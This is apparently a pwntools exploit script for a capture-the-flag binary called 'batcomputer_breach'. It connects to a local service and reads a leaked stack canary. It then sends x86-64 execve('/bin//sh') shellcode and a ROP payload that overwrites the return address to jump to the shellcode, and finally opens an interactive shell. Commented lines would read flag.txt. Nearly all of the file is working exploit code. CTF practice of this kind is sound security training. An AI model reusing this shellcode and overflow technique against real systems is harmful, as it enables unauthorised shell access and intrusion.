#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template batcomputer_breach --host localhost --port 1338
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'batcomputer_breach')

# ./exploit.py DBG - context.log_level = 'debug'
# ./exploit.py NOASLR - turn off aslr
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 1338)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    p = connect(host, port)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LCL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def inter() : return p.interactive()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# LOGGING
def logg(libc_base, pie_base, heap_base):
    if (libc_base != 0) :
        info(f"LIBC: {hex(libc_base)}")
    elif (pie_base != 0) :
        info(f"PIE: {hex(pie_base)}")
    elif (heap_base != 0) :
        info(f"HEAP: {hex(heap_base)}")

'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
                        BEGIN EXPLOIT
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

p = start()

# sla(b'DEVICE',b'2')
# sla(b'>>',b'9')
ru(b'DATA: '); canary = int(rl().decode(),16); info(f"CANARY: {hex(canary)}")
sla(b'DEVICE',b'1')

shellcode = b'\x48\x31\xc0\x50\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05'

offset = cyclic(24)
rop = ROP(exe)
rop.raw(offset)
rop.raw(canary)
rop.raw(cyclic(8))
rop.raw(0x4040c0)
payload = rop.chain()

sla(b'SHELLCODE...',shellcode)
sla(b'PAYLOAD...',payload)

# sl(b"echo '$$'")
# ru(b'$$\n')
# sl(b'cat flag.txt')
info("SPAWNING SHELL...");
# rl();rl();rl()
# flag = rl().strip().decode()
# log.success(f"FLAG: {flag}")

inter()

